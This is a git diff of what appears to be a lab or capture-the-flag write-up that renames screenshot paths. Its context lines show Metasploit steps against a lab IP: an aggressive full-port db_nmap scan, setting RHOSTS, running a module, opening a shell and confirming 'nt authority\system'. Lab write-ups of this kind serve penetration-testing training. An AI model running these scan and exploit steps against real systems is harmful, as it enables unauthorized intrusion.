@@ -164,11 +164,11 @@ msf -> `db_nmap -sV -p- -T5 -A 10.129.203.65`
 
 msf -> `hosts`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 msf -> `services`
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 5000 -> HTTP -> go to website 10.129.203.65:5000
 
@@ -185,13 +185,13 @@ msf -> `set RHOSTS 10.129.203.65`
 
 msf -> `run`
 
-<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `shell`
 
 `whoami`
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ANSWER: **`nt authority\system`**
 
